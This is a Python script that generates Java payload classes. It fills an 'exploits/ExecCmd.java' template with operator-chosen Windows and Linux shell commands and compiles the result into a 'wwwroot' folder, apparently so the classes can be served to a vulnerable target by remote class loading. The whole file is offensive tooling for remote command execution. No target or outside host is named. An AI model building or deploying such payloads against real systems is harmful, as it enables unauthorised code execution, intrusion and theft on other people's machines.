#!/usr/bin/python3
import argparse
import subprocess
import sys
import os
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler


def check_if_installed(prog):
    try:
        result = subprocess.call([prog, '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except Exception:
        result = -1
    finally:
        if result != 0:
            print(f'{prog} is not installed...exiting')
            sys.exit(1)

def ensure_dir_exists(dir_name):
    if os.path.isdir(dir_name):
        return
    try:
        os.mkdir(dir_name)
    except Exception:
        print(f'Error unable to create dir : {dir_name} .......exiting')
        sys.exit(1)

def compile_cmd_file(name, w_cmd, l_cmd):
    try:
        with open(f'exploits/ExecCmd.java', "r") as template:
            source = template.read().replace("<CLASS_NAME>", name).replace("<W_CMD>", w_cmd).replace("<L_CMD>", l_cmd)
    
        with open(f'build_tmp/{name}.java', "w+") as dest:
            dest.write(str(source))
       
        print(f'{name} java file created success')
        subprocess.run(["javac", "-d", "wwwroot", f'build_tmp/{name}.java'])
        print("Just compiled payload")
    except Exception as e:
        print(f'Something went wrong compiling java file {name} : {e}')

def format(cmd):
    return cmd.replace('\\', '\\\\').replace('"', '\\"')

def build_cmd(name, w_cmd, l_cmd):
    check_if_installed("javac")

    ensure_dir_exists("build_tmp")
    ensure_dir_exists("wwwroot")

    compile_cmd_file(name, format(w_cmd), format(l_cmd))

if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(
                description='please enter the values ')
        
        parser.add_argument('class_name', type=str,
                help='Enter the name of the class to create.')

        parser.add_argument('-w', type=str,
                help='the command to execute on a windows system.  will be run as CMD \C "your command"', default = "")

        parser.add_argument('-l', type=str,
                help='the command to execute on a linux type systems.  will be run as /bin/sh -c "your command"', default = "")

        args = parser.parse_args()
        print("about to start.....")
        build_cmd(args.class_name, args.w, args.l)
    except KeyboardInterrupt:
        print("[EXIT] User interrupted the program.")
        sys.exit(0)
